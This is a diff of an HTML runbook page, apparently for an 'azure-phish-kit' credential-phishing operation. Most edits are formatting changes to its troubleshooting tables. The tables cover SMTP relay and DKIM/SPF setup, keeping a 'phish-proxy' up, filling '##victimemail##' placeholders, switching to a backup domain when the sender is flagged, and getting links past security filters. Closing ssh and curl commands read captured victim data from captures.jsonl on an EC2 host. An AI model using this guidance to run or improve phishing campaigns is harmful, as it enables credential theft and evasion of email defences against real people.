     <tr><td>SMTP auth fails</td><td>Re-enter credentials; check relay requires IP whitelisting</td></tr>
     <tr><td>Connection timeout</td><td>Test with <code>telnet smtp.relay.com 587</code>; check firewall</td></tr>
     <tr><td>"Relay access denied"</td><td>Enable "Authenticate before send" in SMTP settings</td></tr>
-    <tr><td>Emails stuck in outbox</td><td>Throttle too high — lower to 25/hr</td></tr>
+    <tr><td>Emails stuck in outbox</td><td>Throttle too high &mdash; lower to 25/hr</td></tr>
     <tr><td>TLS handshake fails</td><td>Try port 465/SSL instead of 587/STARTTLS</td></tr>
   </tbody>
 </table>
@@ -839,8 +838,8 @@ cp /Users/sk_hga/azure-phish-kit/CURRENT_LINK.txt ~/glnt-data/campaigns/spring-p
 <table>
   <thead><tr><th>Symptom</th><th>Action</th></tr></thead>
   <tbody>
-    <tr><td>DKIM "none"</td><td>DNS not propagated — wait 24h and retest</td></tr>
-    <tr><td>DKIM "fail"</td><td>Key mismatch — contact relay provider</td></tr>
+    <tr><td>DKIM "none"</td><td>DNS not propagated &mdash; wait 24h and retest</td></tr>
+    <tr><td>DKIM "fail"</td><td>Key mismatch &mdash; contact relay provider</td></tr>
     <tr><td>SPF fail but DKIM passes</td><td>Add <code>include:_spf.your-relay.com</code> to SPF record</td></tr>
   </tbody>
 </table>
@@ -850,11 +849,11 @@ cp /Users/sk_hga/azure-phish-kit/CURRENT_LINK.txt ~/glnt-data/campaigns/spring-p
 <table>
   <thead><tr><th>Symptom</th><th>Check</th></tr></thead>
   <tbody>
-    <tr><td>High opens, zero clicks</td><td>Link broken or URL-wrapped by security filter — click test email yourself</td></tr>
-    <tr><td>High clicks, zero captures</td><td>Bootloader/proxy down — <code>curl -I https://&lt;domain&gt;/</code> should return 200; <code>systemctl status phish-proxy</code></td></tr>
-    <tr><td>Bounce rate climbing</td><td><strong>Pause immediately</strong> — sender domain flagged; switch to backup domain</td></tr>
+    <tr><td>High opens, zero clicks</td><td>Link broken or URL-wrapped by security filter &mdash; click test email yourself</td></tr>
+    <tr><td>High clicks, zero captures</td><td>Bootloader/proxy down &mdash; <code>curl -I https://&lt;domain&gt;/</code> should return 200; <code>systemctl status phish-proxy</code></td></tr>
+    <tr><td>Bounce rate climbing</td><td><strong>Pause immediately</strong> &mdash; sender domain flagged; switch to backup domain</td></tr>
     <tr><td>Open rate &lt; 10%</td><td>Subject/sender weak OR emails landing in Promotions/Spam tab</td></tr>
-    <tr><td>Sent but not received</td><td>Landing in spam or silently dropped — check with mail-tester.com</td></tr>
+    <tr><td>Sent but not received</td><td>Landing in spam or silently dropped &mdash; check with mail-tester.com</td></tr>
   </tbody>
 </table>
 
@@ -863,8 +862,8 @@ cp /Users/sk_hga/azure-phish-kit/CURRENT_LINK.txt ~/glnt-data/campaigns/spring-p
 <table>
   <thead><tr><th>Symptom</th><th>Cause</th><th>Fix</th></tr></thead>
   <tbody>
-    <tr><td><code>{RECIPIENT_NAME}</code> appears literally</td><td>sed substitution failed</td><td>Re-run <code>build-campaign-email.sh</code></td></tr>
-    <tr><td><code>##victimemail##</code> appears in attachment</td><td>Placeholder not replaced</td><td>Use manual sed per Section 4.3</td></tr>
+    <tr><td><code>{RECIPIENT_NAME}</code> appears literally</td><td>sed substitution failed &mdash; name arg missing or blank</td><td>Re-run <code>build-campaign-email.sh</code> (defaults to "Colleague" if omitted)</td></tr>
+    <tr><td><code>##victimemail##</code> appears in attachment</td><td>Placeholder not replaced &mdash; use generic phrase</td><td>Use manual sed per Section 4.3 (replace with generic text like "your email address")</td></tr>
     <tr><td>Missing button in preview</td><td><code>{LINK}</code> not replaced</td><td>Verify link was passed as <code>$2</code></td></tr>
   </tbody>
 </table>
@@ -883,6 +882,8 @@ ssh ubuntu@&lt;EC2-IP&gt; "journalctl -u phish-proxy -f -n 50"
 curl -s "http://&lt;EC2-IP&gt;:9092/?token=&lt;TOKEN&gt;" | head -20
 ssh ubuntu@&lt;EC2-IP&gt; "tail -20 /home/ubuntu/azure-phish-kit/data/captures.jsonl"
 ssh ubuntu@&lt;EC2-IP&gt; "grep '&lt;campaign-id&gt;' /home/ubuntu/azure-phish-kit/data/captures.jsonl | wc -l"</code></pre>
+
+<p style="text-align:center; margin-top:48px; color:var(--ink-faint); font-family: 'JetBrains Mono', 'Menlo', 'Consolas', monospace; font-size: 0.7rem; letter-spacing: 0.08em;">End of FM-005</p>
 
 <div class="footer">
   <span>FM-005 &middot; STRASSER &#x271B; LAB</span>
